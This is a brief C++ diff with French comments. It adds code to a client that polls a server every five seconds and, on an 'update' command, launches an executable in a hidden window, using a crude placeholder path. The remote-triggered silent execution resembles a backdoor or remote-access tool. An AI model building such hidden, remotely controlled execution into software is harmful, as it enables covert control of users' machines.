@@ -67,13 +67,21 @@ string GetCommand() {
     return command;
 }
 
+// Fonction pour lançer les maj
+void StartUpdate(const string& UpdaterPath) {
+    ShellExecute(NULL, "open", UpdaterPath.c_str(), NULL, NULL, SW_HIDE);
+}
+
 // Thread qui interroge périodiquement le serveur pour vérifier la commande.
 void ListenForCommand() {
     while (true) {
         string cmd = GetCommand();
 
-        if (cmd.find("show") != string::npos) {
+        if (cmd == "show") {
             ShowMessage();
+        }
+        else if (cmd == "update") {
+            StartUpdate("bite");
         }
 
         this_thread::sleep_for(chrono::seconds(5));
